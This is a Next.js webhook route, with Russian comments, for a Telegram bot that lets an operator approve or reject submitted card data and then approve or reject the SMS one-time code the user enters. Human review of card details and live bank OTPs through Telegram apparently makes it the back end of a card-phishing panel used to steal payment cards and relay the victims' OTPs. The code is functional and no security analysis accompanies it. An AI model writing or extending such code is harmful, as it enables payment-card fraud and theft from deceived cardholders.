import { NextRequest, NextResponse } from 'next/server';
import { APP_CONFIG } from '../../../env.config';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    console.log('Webhook received:', JSON.stringify(body, null, 2));

    if (body.callback_query) {
      const callbackData = body.callback_query.data;
      const chatId = body.callback_query.message.chat.id;
      const messageId = body.callback_query.message.message_id;
      const originalMessage = body.callback_query.message.text;

      console.log('Processing callback:', callbackData);

      // СНАЧАЛА проверяем OTP кнопки
      if (callbackData.startsWith('approve_otp_') || callbackData.startsWith('reject_otp_')) {
        const parts = callbackData.split('_');
        const action = parts[0]; // approve или reject
        const sessionId = parts[2]; // ID сессии

        console.log('OTP Session ID:', sessionId, 'OTP Action:', action);

        if (action === 'approve') {
          // OTP код правильный - одобряем платеж
          await fetch(`${APP_CONFIG.APP_URL}/api/payment-status-vercel`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              status: 'approved'
            })
          });

          // Редактируем сообщение вместо удаления
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: messageId,
              text: `${originalMessage}

✅ **РЕЗУЛЬТАТ:** OTP код подтвержден! Платеж успешно обработан.
🕐 Время обработки: ${new Date().toLocaleString('ru-RU')}`,
              parse_mode: 'Markdown'
            })
          });

        } else if (action === 'reject') {
          // OTP код неправильный - возвращаем на ввод OTP
          await fetch(`${APP_CONFIG.APP_URL}/api/payment-status-vercel`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              status: 'otp_error'
            })
          });

          // Редактируем сообщение вместо удаления
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: messageId,
              text: `${originalMessage}

❌ **РЕЗУЛЬТАТ:** OTP код неверный. Пользователь должен ввести код повторно.
🕐 Время обработки: ${new Date().toLocaleString('ru-RU')}`,
              parse_mode: 'Markdown'
            })
          });
        }

      // ПОТОМ проверяем обычные кнопки (данные карты)
      } else if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
        const sessionId = callbackData.split('_')[1];
        const action = callbackData.split('_')[0];

        console.log('Session ID:', sessionId, 'Action:', action);

        if (action === 'approve') {
          // Данные одобрены - запрашиваем OTP у пользователя
          // SMS провайдер отправит реальный код пользователю
          
          // Сохраняем статус запроса OTP
          await fetch(`${APP_CONFIG.APP_URL}/api/payment-status-vercel`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              status: 'otp_requested'
            })
          });

          // Редактируем сообщение вместо удаления
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: messageId,
              text: `${originalMessage}

✅ **РЕЗУЛЬТАТ:** Данные одобрены!
📱 Пользователю открыта страница для ввода OTP кода.
📨 SMS провайдер отправит код на его телефон.
⏳ Ожидаем ввода кода пользователем...
🕐 Время обработки: ${new Date().toLocaleString('ru-RU')}`,
              parse_mode: 'Markdown'
            })
          });

        } else if (action === 'reject') {
          // Сохраняем статус отклонения данных
          await fetch(`${APP_CONFIG.APP_URL}/api/payment-status-vercel`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              status: 'rejected'
            })
          });

          // Редактируем сообщение вместо удаления
          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: messageId,
              text: `${originalMessage}

❌ **РЕЗУЛЬТАТ:** Данные отклонены. Пользователь будет перенаправлен для повторного ввода данных.
🕐 Время обработки: ${new Date().toLocaleString('ru-RU')}`,
              parse_mode: 'Markdown'
            })
          });
        }
      }

      // Отвечаем на callback query
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: 'Обработано!'
        })
      });
    }

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
} 